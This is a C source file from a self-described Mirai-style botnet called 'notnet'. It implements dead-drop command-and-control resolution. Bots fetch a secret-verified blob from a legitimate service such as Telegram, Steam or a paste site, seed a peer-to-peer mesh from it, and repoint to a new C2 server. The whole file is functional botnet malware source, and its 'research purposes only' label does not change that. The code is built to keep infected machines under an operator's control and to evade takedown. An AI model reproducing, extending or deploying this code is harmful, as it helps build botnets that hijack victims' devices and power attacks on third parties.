/*
 * notnet - Modern Mirai-Style Botnet
 * deaddrop.c - Dead-drop C2 resolution (#86)
 *
 * Research purposes only.
 *
 * A dead drop is an opaque endpoint blob hosted on a legitimate service
 * (Telegram channel message, Steam community profile, pastebin-style HTTP).
 * The bot fetches it over plaintext HTTP at boot and every
 * dead_drop_interval seconds, and applies it as an override for the C2
 * endpoints — but only when the blob verifies against the shared c2_secret.
 *
 * The transport is deliberately NOT a trust boundary (the default build has
 * no TLS). The verification gate is a secret echo: the operator composes the
 * blob with secret=<c2_secret>, and the bot refuses to apply any fetch that
 * does not match. A stale or taken-over drop cannot repoint the bot without
 * the secret, so static config is a safe fallback when the fetch fails,
 * is malformed, or is unverified.
 */
#include "config.h"
#include "protocol.h"
#include "deaddrop.h"
#include "mesh.h"
#include "util.h"
#include <string.h>
#include <stdlib.h>

/* Extract the value of a named key from a flat key=value dead-drop blob.
 * Keys/values are separated by '&' or newlines (tolerating surrounding
 * whitespace). Returns 1 and fills out (NUL-terminated, bounded) when the
 * key is found, 0 otherwise. */
static int dd_field(const char *body, const char *key, char *out, size_t out_sz) {
    size_t klen = strlen(key);
    const char *p = body;
    while (*p) {
        while (*p == '&' || *p == '\n' || *p == '\r' ||
               *p == ' ' || *p == '\t') p++;
        const char *start = p;
        while (*p && *p != '&' && *p != '\n' && *p != '\r') p++;
        size_t tlen = (size_t)(p - start);
        if (tlen > klen && strncmp(start, key, klen) == 0 && start[klen] == '=') {
            const char *val = start + klen + 1;
            size_t vlen = (size_t)(p - val);
            if (vlen >= out_sz) vlen = out_sz - 1;
            memcpy(out, val, vlen);
            out[vlen] = '\0';
            return 1;
        }
    }
    out[0] = '\0';
    return 0;
}

/* Verification gate (#86): a dead-drop blob is trusted only when it echoes
 * the shared c2_secret (proof of possession — the operator, and only the
 * operator, knows it). Fail-closed: an empty secret, a blob with no secret=
 * field, or a mismatch all reject the fetch. This is the whole trust
 * boundary; the transport is plaintext by design. */
static int dd_verify(const notnet_bot_t *bot, const char *body) {
    if (bot->secret[0] == '\0') {
        log_warn("Dead-drop: c2_secret unset, refusing unverified blob");
        return 0;
    }
    char got[sizeof(bot->secret)];
    if (!dd_field(body, "secret", got, sizeof(got))) {
        log_warn("Dead-drop: blob has no secret= field, rejected");
        return 0;
    }
    /* #237: compare CONSTANT-TIME, matching http_body_has_secret
     * (#175/#181) and the proxy/relay token checks (#11). Length is
     * checked first (it leaks nothing the echo does not), then a
     * volatile-accumulate XOR loop covers the full secret so mismatch
     * position is not observable in timing. */
    size_t glen = strlen(got);
    size_t slen = strlen(bot->secret);
    if (glen != slen) {
        log_warn("Dead-drop: secret mismatch, blob rejected");
        return 0;
    }
    volatile unsigned char diff = 0;
    for (size_t i = 0; i < slen; i++) {
        diff |= (unsigned char)got[i] ^ (unsigned char)bot->secret[i];
    }
    if (diff != 0) {
        log_warn("Dead-drop: secret mismatch, blob rejected");
        return 0;
    }
    return 1;
}

int deaddrop_resolve(notnet_bot_t *bot) {
    if (bot->dead_drop_url[0] == '\0') {
        log_debug("Dead-drop: no dead_drop_url configured, disabled");
        return -1;
    }

    /* Fetch the blob into a bounded buffer: DEAD_DROP_MAX_BODY for the body
     * plus room for the HTTP status line and headers. http_get_url() returns
     * the full response (status + headers + body) and caps the total at the
     * buffer size, so there is no unbounded parsing. */
    char raw[DEAD_DROP_MAX_BODY + 1024];
    int n = http_get_url(bot, bot->dead_drop_url, raw, sizeof(raw));
    if (n <= 0) {
        log_warn("Dead-drop: fetch of %s failed", bot->dead_drop_url);
        return -1;
    }

    char *body = strstr(raw, "\r\n\r\n");
    if (!body) {
        log_warn("Dead-drop: malformed HTTP response from %s", bot->dead_drop_url);
        return -1;
    }
    body += 4;

    /* Never apply an unverified fetch. */
    if (!dd_verify(bot, body)) return -1;

    /* #139: the verified blob may also carry a `peers=` seed list for the
     * P2P mesh. It is NOT a command — peers are just reachability hints;
     * commands are gated by the operator ed25519 signature, never by the
     * drop. Seeding is best-effort and never fails the dead-drop apply. */
    mesh_seed_from_blob(body);

    char server[256];
    int have_server = dd_field(body, "server", server, sizeof(server));
    if (have_server && server[0] == '\0') have_server = 0;

    uint16_t port = 0;
    char port_str[8];
    if (dd_field(body, "port", port_str, sizeof(port_str))) {
        int p = atoi(port_str);
        if (p >= 1 && p <= 65535) port = (uint16_t)p;
    }

    if (!have_server) {
        log_warn("Dead-drop: verified blob has no server= field, nothing to override");
        return -1;
    }

    /* Apply the override. The dead-drop repoints the primary (HTTP) C2
     * endpoint; port defaults to the existing configured port when absent.
     * Static IRC/WS endpoints are left untouched. */
    strncpy(bot->c2_http.server, server, sizeof(bot->c2_http.server) - 1);
    bot->c2_http.server[sizeof(bot->c2_http.server) - 1] = '\0';
    if (port) bot->c2_http.port = port;

    log_info("Dead-drop: applied verified C2 override %s:%u (from %s)",
             bot->c2_http.server, bot->c2_http.port, bot->dead_drop_url);

    /* SECURITY FIX (#93): a verified repoint resets the rotation
     * failure streak and returns to the primary endpoint, so the
     * fresh drop gets a fair chance before any static c2_backup_<n>
     * rotation applies. */
    c2_rotation_note_repoint(bot);
    return 0;
}
